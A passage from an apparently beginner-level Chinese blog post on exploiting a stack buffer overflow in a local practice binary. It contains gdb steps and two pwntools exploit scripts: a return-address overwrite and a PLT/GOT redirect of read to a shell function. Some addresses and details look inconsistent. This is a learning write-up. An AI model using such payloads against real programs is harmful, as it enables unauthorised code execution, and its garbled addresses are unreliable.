punctuation">)</span><span class="token punctuation">{</span>　　<span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>　　按照之前的说法，我们需要知道 ①数组<code>s</code>起始地址 ②<code>ret</code>指令对应地址 ③两者之间的差（用于填充无关字节使其后的字节处于溢出状态）④<code>shell()</code>函数的地址       </p><p>　　数组<code>s</code>的起始地址可以通过<code>gdb</code>工具调试得来，找到运行<code>read</code>函数的地址即可；<code>ret</code>指令地址基本类似；两者之间的差就是十六进制的加减法，很好算。首先要用<code>gcc</code>工具将c代码编译成二进制可执行文件，然后再通过<code>gdb</code>工具调试。注意，指令应为：<code>gcc xxx.c -o 自定义的可执行文件名 -no-pie</code>。<code>pie</code>是程序随机化保护，不关掉的话每次运行变量函数的地址都不一样，难以攻击。      </p><p>　　关于gdb的使用过程：       </p><pre class=" language-bash"><code class="language-bash">假设可执行文件名为vul（后缀名正常情况下为.o，在此不重要）gdb vulb vul       <span class="token comment" spellcheck="true">#在vul()函数下断点，（b后按tab会有可选项）可将可执行文件拖入IDA中查看伪代码</span>run         <span class="token comment" spellcheck="true">#跑起来</span>n           <span class="token comment" spellcheck="true">#即next，向下执行，直到执行到read，记下当前地址（0x7fffffffe090）</span>n           <span class="token comment" spellcheck="true">#向下执行，直到执行到ret，当前地址（0x7fffffffe0b8）   </span></code></pre><p>　　<img src="/images/2019-03-19-栈溢出（一）_1.png" alt="这是一个暗搓搓的read示意图">　　　　　　　　<br>  　　　　　　　　　　　　<br>　　<img src="/images/2019-03-19-栈溢出（一）_2.png" alt="这是一个暗搓搓的ret示意图">　　　　　　　　　</p><p>　　接下来就是作差，可得是40，即是两者之间相差40字节，从<code>s</code>处用40个字节可以填充中间数据段，再写就可以溢出，影响<code>ret</code>，影响函数执行后的跳转位置。接下来查看我们“恶意代码”的位置，并将这段地址填入<code>ret</code>中。<code>system(&quot;/bin/shell&quot;);</code>这一段代码是可执行文件里自带的，这样比较简单，比较好找，可以拖入IDA中查看，找到<code>_system</code>，按空格即可找到对应位置，我们的是<code>08048310</code>。因为linux是小端存储，所以将这个地址倒向填入，即<code>\x10\x83\x04\x03\x00\x00\x00\x00</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>              <span class="token comment" spellcheck="true">#pwn即pwntools，一个很好用的库</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./vul'</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">#启动程序，形成进程</span>payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token string">'\x10\x83\x04\x03\x00\x00\x00\x00'</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">#在这卡一下，使程序不会运行的太快以至于？？？</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true">#弹回一个交互式shell</span></code></pre><p>即可。<br>P.S.　<code>raw_input()</code>　是为了给程序刹个车，不让它走的太快，因为……因为啥我忘了……</p><h2 id="三、另一种办法"><a href="#三、另一种办法" class="headerlink" title="三、另一种办法"></a>三、另一种办法</h2><p>　　还有一种办法是通过延迟绑定技术实现，延迟绑定技术是指#####它的优势是：####### GOT表项的地址对应真实数据，PLT表项的地址对应的是在GOT中的地址。   </p><p>　　攻击脚本如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./vul'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">44</span> <span class="token operator">+</span> <span class="token string">'\x00\x83\x04\x08'</span> <span class="token operator">+</span> <span class="token string">'\x00\x83\x04\x08'</span> <span class="token operator">+</span> <span class="token string">'\x00\x00\x00\x00'</span> <span class="token operator">+</span> <span class="token string">'\x0c\xA0\x04\x08'</span> <span class="token operator">+</span> <span class="token string">'\x04\x00\x00\x00'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x3B\x84\x04\x08'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>　　<img src="/images/2019-03-19-栈溢出（一）_3.jpg" alt="这是一个稚嫩又潦草的手绘栈图示">      </p><h3 id="3-1-详细阐述一下payload的每个部分和工作运行的细节"><a href="#3-1-详细阐述一下payload的每个部分和工作运行的细节" class="headerlink" title="3.1 详细阐述一下payload的每个部分和工作运行的细节"></a>3.1 详细阐述一下payload的每个部分和工作运行的细节</h3><p>（payload由44个a和五个小字符串拼接而成，将五个小字符串标记序号12345，将倒数第二行的标记为6）<br>44个a：老样子，还是填充无关字节到ret<br>字符串1，2：<code>read_plt</code><br>字符串3，4，5：代表read的三个参数(0, read_got, 4)<br>字符串6：shell的地址<br><strong>关于如何查看这几个地址，IDA中按空格键即可。</strong>       </p><h3 id="3-2-read函数总共运行三次"><a href="#3-2-read函数总共运行三次" class="headerlink" title="3.2 read函数总共运行三次"></a>3.2 read函数总共运行三次</h3><p>第一次：通过read函数填充字符串起始位置到ret之间的空间，通过溢出将payload整个部署到ret以及后面的部分上，相当于整体布局的作用。<br>第二次：上一个read执行完，开始ret的时候出现异常，因为此时ret所指向的返回地址已经被修改成了<code>read_plt</code>。跳转后执行read，三个参数是(0, read_got, 4)，4的意思是地址只需要4个字节。此时read执行尚未完毕，处于待输入状态，<code>io.send(&#39;\x3B\x84\x04\x08&#39;)</code>将shell的地址输入进去，即：将<code>read_got</code>修改成了shell的地址。<code>read_got→shell</code><br>第三次：上一个read执行完，下面还是一个<code>read_plt</code>，按理说看见这个应该跳到<code>read_got</code>（<code>read_plt</code>指向<code>read_got</code>），但这时的<code>read_got</code>已经在上一步中修改成了<code>shell</code>的地址，即：实际上ret跳转是跳到了<code>shell</code>上。<code>read_plt→read_got→shell</code><br>（第一个ret跳转的read参数直接取下面的三个值了，先跳过了第二个read，执行完才继续执行第二个read，取参数整体似乎不是按照顺序来的，到底为什么尚未可知，学一学编程或者基础知识再说吧，要不然耽误写脚本）      </p><h1 id="3-x-这样就成功了！！！-3」∠"><a href="#3-x-这样就成功了！！！-3」∠" class="headerlink" title="3.x 这样就成功了！！！(:3」∠)"></a>3.x 这样就成功了！！！<em>(:3」∠)</em></h1>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
